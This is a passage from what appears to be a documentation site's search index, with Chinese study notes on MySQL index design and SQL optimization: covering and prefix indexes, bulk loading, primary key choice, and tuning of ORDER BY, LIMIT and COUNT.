index;</code>\uff1a\u67e5\u627e\u4f7f\u7528\u4e86\u7d22\u5f15\uff0c\u4f46\u662f\u9700\u8981\u7684\u6570\u636e\u90fd\u5728\u7d22\u5f15\u5217\u4e2d\u80fd\u627e\u5230\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u56de\u8868\u67e5\u8be2</p> <p>\u8986\u76d6\u7d22\u5f15\uff1a \u5982\u679c\u5728\u751f\u6210\u7684\u4e8c\u7ea7\u7d22\u5f15\uff08\u8f85\u52a9\u7d22\u5f15\uff09\u4e2d\u53ef\u4ee5\u4e00\u6b21\u6027\u83b7\u5f97select\u6240\u9700\u8981\u7684\u5b57\u6bb5\uff0c\u4e0d\u9700\u8981\u56de\u8868\u67e5\u8be2\u3002</p> <p>\u5982\u679c\u5728\u805a\u96c6\u7d22\u5f15\u4e2d\u76f4\u63a5\u80fd\u627e\u5230\u5bf9\u5e94\u7684\u884c\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u884c\u6570\u636e\uff0c\u53ea\u9700\u8981\u4e00\u6b21\u67e5\u8be2\uff0c\u54ea\u6015\u662fselect *\uff1b \u5982\u679c\u5728\u8f85\u52a9\u7d22\u5f15\uff08\u4e8c\u7ea7\u7d22\u5f15\uff09\u4e2d\u627e\u805a\u96c6\u7d22\u5f15\uff0c\u5982<code>select id, name from xxx where name='xxx';</code>\uff0c\u4e5f\u53ea\u9700\u8981\u901a\u8fc7\u8f85\u52a9\u7d22\u5f15(name)\u67e5\u627e\u5230\u5bf9\u5e94\u7684id\uff0c\u8fd4\u56dename\u548cname\u7d22\u5f15\u5bf9\u5e94\u7684id\u5373\u53ef\uff0c\u53ea\u9700\u8981\u4e00\u6b21\u67e5\u8be2\uff1b  \u5982\u679c\u662f\u901a\u8fc7\u8f85\u52a9\u7d22\u5f15\u67e5\u627e\u5176\u4ed6\u5b57\u6bb5\uff0c\u5219\u9700\u8981\u56de\u8868\u67e5\u8be2\uff0c\u5982<code>select id, name, gender from xxx where name='xxx';</code> </p> <p>\u6240\u4ee5\u5c3d\u91cf\u4e0d\u8981\u7528<code>select *</code>\uff0c\u5bb9\u6613\u51fa\u73b0\u56de\u8868\u67e5\u8be2\uff0c\u964d\u4f4e\u6548\u7387\uff0c\u9664\u975e\u6709\u8054\u5408\u7d22\u5f15\u5305\u542b\u4e86\u6240\u6709\u5b57\u6bb5  </p> <p>\u9762\u8bd5\u9898\uff1a\u4e00\u5f20\u8868\uff0c\u6709\u56db\u4e2a\u5b57\u6bb5\uff08id, username, password, status\uff09\uff0c\u7531\u4e8e\u6570\u636e\u91cf\u5927\uff0c\u9700\u8981\u5bf9\u4ee5\u4e0bSQL\u8bed\u53e5\u8fdb\u884c\u4f18\u5316\uff0c\u8be5\u5982\u4f55\u8fdb\u884c\u624d\u662f\u6700\u4f18\u65b9\u6848\uff1a <code>select id, username, password from tb_user where username='itcast';</code></p> <p>\u89e3\uff1a\u7ed9username\u548cpassword\u5b57\u6bb5\u5efa\u7acb\u8054\u5408\u7d22\u5f15\uff0c\u5219\u4e0d\u9700\u8981\u56de\u8868\u67e5\u8be2\uff0c\u76f4\u63a5\u8986\u76d6\u7d22\u5f15\u3002 username\u548cpassword\u5b57\u6bb5\u5efa\u7acb\u8054\u5408\u7d22\u5f15\u7684\u53f6\u5b50\u8282\u70b9\u6302\u7684\u5c31\u662f id \u6240\u4ee5\u4e0d\u9700\u8981\u4e09\u8005\u540c\u65f6\u5efa\u7d22\u5f15\u3002</p>"},{"location":"program/2024-04-22-MYSQL/#_65","title":"\u524d\u7f00\u7d22\u5f15","text":"<p>\u5f53\u5b57\u6bb5\u7c7b\u578b\u4e3a\u5b57\u7b26\u4e32\uff08varchar, text\u7b49\uff09\u65f6\uff0c\u6709\u65f6\u5019\u9700\u8981\u7d22\u5f15\u5f88\u957f\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u4f1a\u8ba9\u7d22\u5f15\u53d8\u5f97\u5f88\u5927\uff0c\u67e5\u8be2\u65f6\uff0c\u6d6a\u8d39\u5927\u91cf\u7684\u78c1\u76d8IO\uff0c\u5f71\u54cd\u67e5\u8be2\u6548\u7387\uff0c\u6b64\u65f6\u53ef\u4ee5\u53ea\u964d\u5b57\u7b26\u4e32\u7684\u4e00\u90e8\u5206\u524d\u7f00\uff0c\u5efa\u7acb\u7d22\u5f15\uff0c\u8fd9\u6837\u53ef\u4ee5\u5927\u5927\u8282\u7ea6\u7d22\u5f15\u7a7a\u95f4\uff0c\u4ece\u800c\u63d0\u9ad8\u7d22\u5f15\u6548\u7387\u3002</p> <p>\u8bed\u6cd5\uff1a<code>create index idx_xxxx on table_name(columnn(n));</code> \u524d\u7f00\u957f\u5ea6\uff1a\u53ef\u4ee5\u6839\u636e\u7d22\u5f15\u7684\u9009\u62e9\u6027\u6765\u51b3\u5b9a\uff0c\u800c\u9009\u62e9\u6027\u662f\u6307\u4e0d\u91cd\u590d\u7684\u7d22\u5f15\u503c\uff08\u57fa\u6570\uff09\u548c\u6570\u636e\u8868\u7684\u8bb0\u5f55\u603b\u6570\u7684\u6bd4\u503c\uff0c\u7d22\u5f15\u9009\u62e9\u6027\u8d8a\u9ad8\u5219\u67e5\u8be2\u6548\u7387\u8d8a\u9ad8\uff0c\u552f\u4e00\u7d22\u5f15\u7684\u9009\u62e9\u6027\u662f1\uff0c\u8fd9\u662f\u6700\u597d\u7684\u7d22\u5f15\u9009\u62e9\u6027\uff0c\u6027\u80fd\u4e5f\u662f\u6700\u597d\u7684\u3002  </p> <p>\u6c42\u9009\u62e9\u6027\u516c\u5f0f\uff1a MySQL<pre><code>select count(distinct email) / count(*) from tb_user;\nselect count(distinct substring(email, 1, 5)) / count(*) from tb_user;\n</code></pre> \u524d\u7f00\u7d22\u5f15\u4e2d\u662f\u6709\u53ef\u80fd\u78b0\u5230\u76f8\u540c\u7684\u7d22\u5f15\u7684\u60c5\u51b5\u7684\uff08\u56e0\u4e3a\u9009\u62e9\u6027\u53ef\u80fd\u4e0d\u4e3a1\uff09\uff0c\u6240\u4ee5\u4f7f\u7528\u524d\u7f00\u7d22\u5f15\u8fdb\u884c\u67e5\u8be2\u7684\u65f6\u5019\uff0cmysql \u4f1a\u6709\u4e00\u4e2a\u56de\u8868\u67e5\u8be2\u7684\u8fc7\u7a0b\uff0c\u786e\u5b9a\u662f\u5426\u4e3a\u6240\u9700\u6570\u636e\u3002\u5982\u56fe\u4e2d\u7684\u67e5\u8be2\u5230lvbu6\u4e4b\u540e\u8fd8\u8981\u8fdb\u884c\u56de\u8868\uff0c\u56de\u8868\u5b8c\u518d\u67e5xiaoy\uff0c\u770b\u5230xiaoy\u662f\u4e0d\u9700\u8981\u7684\u6570\u636e\uff0c\u5219\u505c\u6b62\u67e5\u4e0b\u4e00\u4e2a\u3002</p> <p></p> <p>show index \u91cc\u9762\u7684sub_part\u53ef\u4ee5\u770b\u5230\u63a5\u53d6\u7684\u957f\u5ea6</p>"},{"location":"program/2024-04-22-MYSQL/#_66","title":"\u5355\u5217\u7d22\u5f15&amp;\u8054\u5408\u7d22\u5f15","text":"<p>\u5355\u5217\u7d22\u5f15\uff1a\u5373\u4e00\u4e2a\u7d22\u5f15\u53ea\u5305\u542b\u5355\u4e2a\u5217 \u8054\u5408\u7d22\u5f15\uff1a\u5373\u4e00\u4e2a\u7d22\u5f15\u5305\u542b\u4e86\u591a\u4e2a\u5217 \u5728\u4e1a\u52a1\u573a\u666f\u4e2d\uff0c\u5982\u679c\u5b58\u5728\u591a\u4e2a\u67e5\u8be2\u6761\u4ef6\uff0c\u8003\u8651\u9488\u5bf9\u4e8e\u67e5\u8be2\u5b57\u6bb5\u5efa\u7acb\u7d22\u5f15\u65f6\uff0c\u5efa\u8bae\u5efa\u7acb\u8054\u5408\u7d22\u5f15\uff0c\u800c\u975e\u5355\u5217\u7d22\u5f15\u3002</p> <p>\u5355\u5217\u7d22\u5f15\u60c5\u51b5\uff1a</p> <p><code>explain select id, phone, name from tb_user where phone = '17799990010' and name = '\u97e9\u4fe1';</code> phone \u548c name \u90fd\u5efa\u7acb\u4e86\u7d22\u5f15\u60c5\u51b5\u4e0b\uff0c\u8fd9\u53e5\u53ea\u4f1a\u7528\u5230phone\u7d22\u5f15\u5b57\u6bb5\u3002</p> <p>\u8054\u5408\u7d22\u5f15\u7684\u6570\u636e\u7ec4\u7ec7\u56fe\uff1a</p> <p></p>"},{"location":"program/2024-04-22-MYSQL/#_67","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ul> <li>\u591a\u6761\u4ef6\u8054\u5408\u67e5\u8be2\u65f6\uff0cMySQL\u4f18\u5316\u5668\u4f1a\u8bc4\u4f30\u54ea\u4e2a\u5b57\u6bb5\u7684\u7d22\u5f15\u6548\u7387\u66f4\u9ad8\uff0c\u4f1a\u9009\u62e9\u8be5\u7d22\u5f15\u5b8c\u6210\u672c\u6b21\u67e5\u8be2\u3002</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_68","title":"\u8bbe\u8ba1\u539f\u5219","text":"<ol> <li>\u9488\u5bf9\u4e8e\u6570\u636e\u91cf\u8f83\u5927\uff0c\u4e14\u67e5\u8be2\u6bd4\u8f83\u9891\u7e41\u7684\u8868\u5efa\u7acb\u7d22\u5f15</li> <li>\u9488\u5bf9\u4e8e\u5e38\u4f5c\u4e3a\u67e5\u8be2\u6761\u4ef6\uff08where\uff09\u3001\u6392\u5e8f\uff08order by\uff09\u3001\u5206\u7ec4\uff08group by\uff09\u64cd\u4f5c\u7684\u5b57\u6bb5\u5efa\u7acb\u7d22\u5f15</li> <li>\u5c3d\u91cf\u9009\u62e9\u533a\u5206\u5ea6\u9ad8\u7684\u5217\u4f5c\u4e3a\u7d22\u5f15\uff0c\u5c3d\u91cf\u5efa\u7acb\u552f\u4e00\u7d22\u5f15\uff0c\u533a\u5206\u5ea6\u8d8a\u9ad8\uff0c\u4f7f\u7528\u7d22\u5f15\u7684\u6548\u7387\u8d8a\u9ad8</li> <li>\u5982\u679c\u662f\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u5b57\u6bb5\uff0c\u5b57\u6bb5\u957f\u5ea6\u8f83\u957f\uff0c\u53ef\u4ee5\u9488\u5bf9\u4e8e\u5b57\u6bb5\u7684\u7279\u70b9\uff0c\u5efa\u7acb\u524d\u7f00\u7d22\u5f15</li> <li>\u5c3d\u91cf\u4f7f\u7528\u8054\u5408\u7d22\u5f15\uff0c\u51cf\u5c11\u5355\u5217\u7d22\u5f15\uff0c\u67e5\u8be2\u65f6\uff0c\u8054\u5408\u7d22\u5f15\u5f88\u591a\u65f6\u5019\u53ef\u4ee5\u8986\u76d6\u7d22\u5f15\uff0c\u8282\u7701\u5b58\u50a8\u7a7a\u95f4\uff0c\u907f\u514d\u56de\u8868\uff0c\u63d0\u9ad8\u67e5\u8be2\u6548\u7387</li> <li>\u8981\u63a7\u5236\u7d22\u5f15\u7684\u6570\u91cf\uff0c\u7d22\u5f15\u5e76\u4e0d\u662f\u591a\u591a\u76ca\u5584\uff0c\u7d22\u5f15\u8d8a\u591a\uff0c\u7ef4\u62a4\u7d22\u5f15\u7ed3\u6784\u7684\u4ee3\u4ef7\u5c31\u8d8a\u5927\uff0c\u4f1a\u5f71\u54cd\u589e\u5220\u6539\u7684\u6548\u7387</li> <li>\u5982\u679c\u7d22\u5f15\u5217\u4e0d\u80fd\u5b58\u50a8NULL\u503c\uff0c\u8bf7\u5728\u521b\u5efa\u8868\u65f6\u4f7f\u7528NOT NULL\u7ea6\u675f\u5b83\u3002\u5f53\u4f18\u5316\u5668\u77e5\u9053\u6bcf\u5217\u662f\u5426\u5305\u542bNULL\u503c\u65f6\uff0c\u5b83\u53ef\u4ee5\u66f4\u597d\u5730\u786e\u5b9a\u54ea\u4e2a\u7d22\u5f15\u6700\u6709\u6548\u5730\u7528\u4e8e\u67e5\u8be2</li> </ol>"},{"location":"program/2024-04-22-MYSQL/#sql_1","title":"SQL \u4f18\u5316","text":""},{"location":"program/2024-04-22-MYSQL/#_69","title":"\u63d2\u5165\u6570\u636e","text":"<p>\u666e\u901a\u63d2\u5165\uff1a</p> <ol> <li>\u91c7\u7528\u6279\u91cf\u63d2\u5165\uff08\u4e00\u6b21\u63d2\u5165\u7684\u6570\u636e\u4e0d\u5efa\u8bae\u8d85\u8fc71000\u6761\uff0c500 - 1000 \u4e3a\u5b9c\uff09</li> <li>\u624b\u52a8\u63d0\u4ea4\u4e8b\u52a1</li> <li>\u4e3b\u952e\u987a\u5e8f\u63d2\u5165\uff08\u4e3b\u952e\u987a\u5e8f\u63d2\u5165\u7684\u6548\u7387\u5927\u4e8e\u4e71\u5e8f\u63d2\u5165\uff09</li> </ol> <p>\u5927\u6279\u91cf\u63d2\u5165\uff1a \u5982\u679c\u4e00\u6b21\u6027\u9700\u8981\u63d2\u5165\u5927\u6279\u91cf\u6570\u636e\uff0c\u4f7f\u7528insert\u8bed\u53e5\u63d2\u5165\u6027\u80fd\u8f83\u4f4e\uff0c\u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528MySQL\u6570\u636e\u5e93\u63d0\u4f9b\u7684load\u6307\u4ee4\u63d2\u5165\u3002</p> MySQL<pre><code># \u5ba2\u6237\u7aef\u8fde\u63a5\u670d\u52a1\u7aef\u65f6\uff0c\u52a0\u4e0a\u53c2\u6570 --local-infile\uff08\u8fd9\u4e00\u884c\u5728bash/cmd\u754c\u9762\u8f93\u5165\uff09\nmysql --local-infile -u root -p\n# \u8bbe\u7f6e\u5168\u5c40\u53c2\u6570local_infile\u4e3a1\uff0c\u5f00\u542f\u4ece\u672c\u5730\u52a0\u8f7d\u6587\u4ef6\u5bfc\u5165\u6570\u636e\u7684\u5f00\u5173\nset global local_infile = 1;\nselect @@local_infile;\n# \u6267\u884cload\u6307\u4ee4\u5c06\u51c6\u5907\u597d\u7684\u6570\u636e\uff0c\u52a0\u8f7d\u5230\u8868\u7ed3\u6784\u4e2d\uff0c\u5148\u8981\u628a\u8868\u5efa\u7acb\u8d77\u6765\u3002\nload data local infile '/root/sql1.log' into table 'tb_user' fields terminated by ',' lines terminated by '\\n';\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#_70","title":"\u4e3b\u952e\u4f18\u5316","text":"<p>\u6570\u636e\u7ec4\u7ec7\u65b9\u5f0f\uff1a\u5728InnoDB\u5b58\u50a8\u5f15\u64ce\u4e2d\uff0c\u8868\u6570\u636e\u90fd\u662f\u6839\u636e\u4e3b\u952e\u987a\u5e8f\u7ec4\u7ec7\u5b58\u653e\u7684\uff0c\u8fd9\u79cd\u5b58\u50a8\u65b9\u5f0f\u7684\u8868\u79f0\u4e3a\u7d22\u5f15\u7ec4\u7ec7\u8868\uff08Index organized table, IOT\uff09</p> <p>\u4e3b\u952e\u7684\u987a\u5e8f\u7684\u63d2\u5165\u8fc7\u7a0b\u5982\u4e0b\uff1a  </p> <p></p> <p>\u4f46\u662f\u5982\u679c\u4e3b\u952e\u662f\u4e71\u5e8f\u63d2\u5165\u7684\u8bdd\uff0c\u5c31\u4f1a\u5bfc\u81f4\u9700\u8981\u63d2\u5165\u7684\u4f4d\u7f6e\u4e3a\u4e2d\u95f4\u7684\u4f4d\u7f6e\uff0c\u4f1a\u6709\u9875\u5206\u88c2\u7684\u8fc7\u7a0b\u3002</p> <p>\u9875\u5206\u88c2\uff1a\u9875\u53ef\u4ee5\u4e3a\u7a7a\uff0c\u4e5f\u53ef\u4ee5\u586b\u5145\u4e00\u822c\uff0c\u4e5f\u53ef\u4ee5\u586b\u5145100%\uff0c\u6bcf\u4e2a\u9875\u5305\u542b\u4e862-N\u884c\u6570\u636e\uff08\u5982\u679c\u4e00\u884c\u6570\u636e\u8fc7\u5927\uff0c\u4f1a\u884c\u6ea2\u51fa\uff09\uff0c\u6839\u636e\u4e3b\u952e\u6392\u5217\u3002</p> <p>\u9875\u5408\u5e76\uff1a\u5f53\u5220\u9664\u4e00\u884c\u8bb0\u5f55\u65f6\uff0c\u5b9e\u9645\u4e0a\u8bb0\u5f55\u5e76\u6ca1\u6709\u88ab\u7269\u7406\u5220\u9664\uff0c\u53ea\u662f\u8bb0\u5f55\u88ab\u6807\u8bb0\uff08flaged\uff09\u4e3a\u5220\u9664\u5e76\u4e14\u5b83\u7684\u7a7a\u95f4\u53d8\u5f97\u5141\u8bb8\u88ab\u5176\u4ed6\u8bb0\u5f55\u58f0\u660e\u4f7f\u7528\u3002\u5f53\u9875\u4e2d\u5220\u9664\u7684\u8bb0\u5f55\u5230\u8fbe MERGE_THRESHOLD\uff08\u9ed8\u8ba4\u4e3a\u9875\u768450%\uff09\uff0cInnoDB\u4f1a\u5f00\u59cb\u5bfb\u627e\u6700\u9760\u8fd1\u7684\u9875\uff08\u524d\u540e\uff09\u770b\u770b\u662f\u5426\u53ef\u4ee5\u5c06\u8fd9\u4e24\u4e2a\u9875\u5408\u5e76\u4ee5\u4f18\u5316\u7a7a\u95f4\u4f7f\u7528\u3002</p> <p>MERGE_THRESHOLD\uff1a\u5408\u5e76\u9875\u7684\u9608\u503c\uff0c\u53ef\u4ee5\u81ea\u5df1\u8bbe\u7f6e\uff0c\u5728\u521b\u5efa\u8868\u6216\u521b\u5efa\u7d22\u5f15\u65f6\u6307\u5b9a</p> <p>\u6587\u5b57\u8bf4\u660e\u4e0d\u591f\u6e05\u6670\u660e\u4e86\uff0c\u5177\u4f53\u53ef\u4ee5\u770b\u89c6\u9891\u91cc\u7684PPT\u6f14\u793a\u8fc7\u7a0b\uff1ahttps://www.bilibili.com/video/BV1Kr4y1i7ru?p=90</p> <p>\u4e3b\u952e\u8bbe\u8ba1\u539f\u5219\uff1a</p> <ul> <li>\u6ee1\u8db3\u4e1a\u52a1\u9700\u6c42\u7684\u60c5\u51b5\u4e0b\uff0c\u5c3d\u91cf\u964d\u4f4e\u4e3b\u952e\u7684\u957f\u5ea6\uff0c\u4e8c\u7ea7\u7d22\u5f15\u7684\u53f6\u5b50\u8282\u70b9\u4fdd\u5b58\u7684\u5c31\u662f\u4e3b\u952e\uff0c\u6240\u4ee5\u4e3b\u952e\u5c0f\u5360\u7528\u7684\u7a7a\u95f4\u4e5f\u5c31\u4f1a\u5c11\u3002</li> <li>\u63d2\u5165\u6570\u636e\u65f6\uff0c\u5c3d\u91cf\u9009\u62e9\u987a\u5e8f\u63d2\u5165\uff0c\u9009\u62e9\u4f7f\u7528 AUTO_INCREMENT \u81ea\u589e\u4e3b\u952e</li> <li>\u5c3d\u91cf\u4e0d\u8981\u4f7f\u7528 UUID \u505a\u4e3b\u952e\u6216\u8005\u662f\u5176\u4ed6\u7684\u81ea\u7136\u4e3b\u952e\uff0c\u5982\u8eab\u4efd\u8bc1\u53f7\uff0c\u5360\u7528\u7684\u7a7a\u95f4\u5927\u3002</li> <li>\u4e1a\u52a1\u64cd\u4f5c\u65f6\uff0c\u907f\u514d\u5bf9\u4e3b\u952e\u7684\u4fee\u6539</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#order-by","title":"order by\u4f18\u5316","text":"<ol> <li>Using filesort\uff1a\u901a\u8fc7\u8868\u7684\u7d22\u5f15\u6216\u5168\u8868\u626b\u63cf\uff0c\u8bfb\u53d6\u6ee1\u8db3\u6761\u4ef6\u7684\u6570\u636e\u884c\uff0c\u7136\u540e\u5728\u6392\u5e8f\u7f13\u51b2\u533a sort buffer \u4e2d\u5b8c\u6210\u6392\u5e8f\u64cd\u4f5c\uff0c\u6240\u6709\u4e0d\u662f\u901a\u8fc7\u7d22\u5f15\u76f4\u63a5\u8fd4\u56de\u6392\u5e8f\u7ed3\u679c\u7684\u6392\u5e8f\u90fd\u53eb FileSort \u6392\u5e8f</li> <li>Using index\uff1a\u901a\u8fc7\u6709\u5e8f\u7d22\u5f15\u987a\u5e8f\u626b\u63cf\u76f4\u63a5\u8fd4\u56de\u6709\u5e8f\u6570\u636e\uff0c\u8fd9\u79cd\u60c5\u51b5\u5373\u4e3a using index\uff0c\u4e0d\u9700\u8981\u989d\u5916\u6392\u5e8f\uff0c\u64cd\u4f5c\u6548\u7387\u9ad8</li> </ol> <p>\u5982\u679corder by\u5b57\u6bb5\u5168\u90e8\u4f7f\u7528\u5347\u5e8f\u6392\u5e8f\u6216\u8005\u964d\u5e8f\u6392\u5e8f\uff0c\u5219\u90fd\u4f1a\u8d70\u7d22\u5f15\uff0c\u4f46\u662f\u5982\u679c\u4e00\u4e2a\u5b57\u6bb5\u5347\u5e8f\u6392\u5e8f\uff0c\u53e6\u4e00\u4e2a\u5b57\u6bb5\u964d\u5e8f\u6392\u5e8f\uff0c\u5219\u4e0d\u4f1a\u8d70\u7d22\u5f15\uff0cexplain\u7684extra\u4fe1\u606f\u663e\u793a\u7684\u662f<code>Using index, Using filesort</code>\uff0c\u5982\u679c\u8981\u4f18\u5316\u6389Using filesort\uff0c\u5219\u9700\u8981\u53e6\u5916\u518d\u521b\u5efa\u4e00\u4e2a\u7d22\u5f15\uff0c\u5982\uff1a<code>create index idx_user_age_phone_ad on tb_user(age asc, phone desc);</code>\uff0c\u6b64\u65f6\u4f7f\u7528<code>select id, age, phone from tb_user order by age asc, phone desc;</code>\u4f1a\u5168\u90e8\u8d70\u7d22\u5f15</p> <p>\u603b\u7ed3\uff1a</p> <ul> <li>\u6839\u636e\u6392\u5e8f\u5b57\u6bb5\u5efa\u7acb\u5408\u9002\u7684\u7d22\u5f15\uff0c\u591a\u5b57\u6bb5\u6392\u5e8f\u65f6\uff0c\u4e5f\u9075\u5faa\u6700\u5de6\u524d\u7f00\u6cd5\u5219</li> <li>\u5c3d\u91cf\u4f7f\u7528\u8986\u76d6\u7d22\u5f15</li> <li>\u591a\u5b57\u6bb5\u6392\u5e8f\uff0c\u4e00\u4e2a\u5347\u5e8f\u4e00\u4e2a\u964d\u5e8f\uff0c\u6b64\u65f6\u9700\u8981\u6ce8\u610f\u8054\u5408\u7d22\u5f15\u5728\u521b\u5efa\u65f6\u7684\u89c4\u5219\uff08ASC/DESC\uff09</li> <li>\u5982\u679c\u4e0d\u53ef\u907f\u514d\u51fa\u73b0filesort\uff0c\u5927\u6570\u636e\u91cf\u6392\u5e8f\u65f6\uff0c\u53ef\u4ee5\u9002\u5f53\u589e\u5927\u6392\u5e8f\u7f13\u51b2\u533a\u5927\u5c0f sort_buffer_size\uff08\u9ed8\u8ba4256k\uff09</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#group-by","title":"group by\u4f18\u5316","text":"<ul> <li>\u5728\u5206\u7ec4\u64cd\u4f5c\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u7d22\u5f15\u6765\u63d0\u9ad8\u6548\u7387</li> <li>\u5206\u7ec4\u64cd\u4f5c\u65f6\uff0c\u7d22\u5f15\u7684\u4f7f\u7528\u4e5f\u662f\u6ee1\u8db3\u6700\u5de6\u524d\u7f00\u6cd5\u5219\u7684</li> </ul> <p>\u5982\u7d22\u5f15\u4e3a<code>idx_user_pro_age_stat</code>\uff0c\u5219\u53e5\u5f0f\u53ef\u4ee5\u662f<code>select ... where profession order by age</code>\uff0c\u8fd9\u6837\u4e5f\u7b26\u5408\u6700\u5de6\u524d\u7f00\u6cd5\u5219</p>"},{"location":"program/2024-04-22-MYSQL/#limit","title":"limit\u4f18\u5316","text":"<p>\u5e38\u89c1\u7684\u95ee\u9898\u5982<code>limit 2000000, 10</code>\uff0c\u6b64\u65f6\u9700\u8981 MySQL \u6392\u5e8f\u524d2000000\u6761\u8bb0\u5f55\uff0c\u4f46\u4ec5\u4ec5\u8fd4\u56de2000000 - 2000010\u7684\u8bb0\u5f55\uff0c\u5176\u4ed6\u8bb0\u5f55\u4e22\u5f03\uff0c\u67e5\u8be2\u6392\u5e8f\u7684\u4ee3\u4ef7\u975e\u5e38\u5927\u3002 \u4f18\u5316\u65b9\u6848\uff1a\u4e00\u822c\u5206\u9875\u67e5\u8be2\u65f6\uff0c\u901a\u8fc7\u521b\u5efa\u8986\u76d6\u7d22\u5f15\u80fd\u591f\u6bd4\u8f83\u597d\u5730\u63d0\u9ad8\u6027\u80fd\uff0c\u53ef\u4ee5\u901a\u8fc7\u8986\u76d6\u7d22\u5f15\u52a0\u5b50\u67e5\u8be2\u5f62\u5f0f\u8fdb\u884c\u4f18\u5316</p> <p>\u4f8b\u5982\uff1a</p> MySQL<pre><code>-- \u6b64\u8bed\u53e5\u8017\u65f6\u5f88\u957f\nselect * from tb_sku limit 9000000, 10;\n-- \u901a\u8fc7\u8986\u76d6\u7d22\u5f15\u52a0\u5feb\u901f\u5ea6\uff0c\u76f4\u63a5\u901a\u8fc7\u4e3b\u952e\u7d22\u5f15\u8fdb\u884c\u6392\u5e8f\u53ca\u67e5\u8be2\nselect id from tb_sku order by id limit 9000000, 10;\n-- \u4e0b\u9762\u7684\u8bed\u53e5\u662f\u9519\u8bef\u7684\uff0c\u56e0\u4e3a MySQL \u4e0d\u652f\u6301 in \u91cc\u9762\u4f7f\u7528 limit\n-- select * from tb_sku where id in (select id from tb_sku order by id limit 9000000, 10);\n-- \u901a\u8fc7\u8fde\u8868\u67e5\u8be2\u5373\u53ef\u5b9e\u73b0\u7b2c\u4e00\u53e5\u7684\u6548\u679c\uff0c\u5e76\u4e14\u80fd\u8fbe\u5230\u7b2c\u4e8c\u53e5\u7684\u901f\u5ea6\nselect * from tb_sku as s, (select id from tb_sku order by id limit 9000000, 10) as a where s.id = a.id;\n</code></pre>"},{"location":"program/2024-04-22-MYSQL/#count","title":"count\u4f18\u5316","text":"<p>MyISAM \u5f15\u64ce\u628a\u4e00\u4e2a\u8868\u7684\u603b\u884c\u6570\u5b58\u5728\u4e86\u78c1\u76d8\u4e0a\uff0c\u56e0\u6b64\u6267\u884c count(*) \u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u8fd4\u56de\u8fd9\u4e2a\u6570\uff0c\u6548\u7387\u5f88\u9ad8\uff08\u524d\u63d0\u662f\u4e0d\u9002\u7528where\uff09\uff1b InnoDB \u5728\u6267\u884c count(*) \u65f6\uff0c\u9700\u8981\u628a\u6570\u636e\u4e00\u884c\u4e00\u884c\u5730\u4ece\u5f15\u64ce\u91cc\u9762\u8bfb\u51fa\u6765\uff0c\u7136\u540e\u7d2f\u8ba1\u8ba1\u6570\u3002 \u4f18\u5316\u65b9\u6848\uff1a\u81ea\u5df1\u8ba1\u6570\uff0c\u5982\u521b\u5efakey-value\u8868\u5b58\u50a8\u5728\u5185\u5b58\u6216\u786c\u76d8\uff0c\u6216\u8005\u662f\u7528redis  </p> <p>count\u7684\u51e0\u79cd\u7528\u6cd5\uff1a</p> <ul> <li>\u5982\u679ccount\u51fd\u6570\u7684\u53c2\u6570\uff08count\u91cc\u9762\u5199\u7684\u90a3\u4e2a\u5b57\u6bb5\uff09\u4e0d\u662fNULL\uff08\u5b57\u6bb5\u503c\u4e0d\u4e3aNULL\uff09\uff0c\u7d2f\u8ba1\u503c\u5c31\u52a0\u4e00\uff0c\u6700\u540e\u8fd4\u56de\u7d2f\u8ba1\u503c </li> <li>\u7528\u6cd5\uff1acount(*)\u3001count(\u4e3b\u952e)\u3001count(\u5b57\u6bb5)\u3001count(1)</li> <li>count(\u4e3b\u952e)\u8ddfcount(*)\u4e00\u6837\uff0c\u56e0\u4e3a\u4e3b\u952e\u4e0d\u80fd\u4e3a\u7a7a\uff1bcount(\u5b57\u6bb5)\u53ea\u8ba1\u7b97\u5b57\u6bb5\u503c\u4e0d\u4e3aNULL\u7684\u884c\uff1bcount(1)\u5f15\u64ce\u4f1a\u4e3a\u6bcf\u884c\u6dfb\u52a0\u4e00\u4e2a1\uff0c\u7136\u540e\u5c31count\u8fd9\u4e2a1\uff0c\u8fd4\u56de\u7ed3\u679c\u4e5f\u8ddfcount(*)\u4e00\u6837\uff1bcount(null)\u8fd4\u56de0</li> </ul> <p>\u5404\u79cd\u7528\u6cd5\u7684\u6027\u80fd\uff1a</p> <ul> <li>count(\u4e3b\u952e)\uff1aInnoDB\u5f15\u64ce\u4f1a\u904d\u5386\u6574\u5f20\u8868\uff0c\u628a\u6bcf\u884c\u7684\u4e3b\u952eid\u503c\u90fd\u53d6\u51fa\u6765\uff0c\u8fd4\u56de\u7ed9\u670d\u52a1\u5c42\uff0c\u670d\u52a1\u5c42\u62ff\u5230\u4e3b\u952e\u540e\uff0c\u76f4\u63a5\u6309\u884c\u8fdb\u884c\u7d2f\u52a0\uff08\u4e3b\u952e\u4e0d\u53ef\u80fd\u4e3a\u7a7a\uff09</li> <li>count(\u5b57\u6bb5)\uff1a\u6ca1\u6709not null\u7ea6\u675f\u7684\u8bdd\uff0cInnoDB\u5f15\u64ce\u4f1a\u904d\u5386\u6574\u5f20\u8868\u628a\u6bcf\u4e00\u884c\u7684\u5b57\u6bb5\u503c\u90fd\u53d6\u51fa\u6765\uff0c\u8fd4\u56de\u7ed9\u670d\u52a1\u5c42\uff0c\u670d\u52a1\u5c42\u5224\u65ad\u662f\u5426\u4e3anull\uff0c\u4e0d\u4e3anull\uff0c\u8ba1\u6570\u7d2f\u52a0\uff1b\u6709not null\u7ea6\u675f\u7684\u8bdd\uff0cInnoDB\u5f15\u64ce\u4f1a\u904d\u5386\u6574\u5f20\u8868\u628a\u6bcf\u4e00\u884c\u7684\u5b57\u6bb5\u503c\u90fd\u53d6\u51fa\u6765\uff0c\u8fd4\u56de\u7ed9\u670d\u52a1\u5c42\uff0c\u76f4\u63a5\u6309\u884c\u8fdb\u884c\u7d2f\u52a0</li> <li>count(1)\uff1aInnoDB 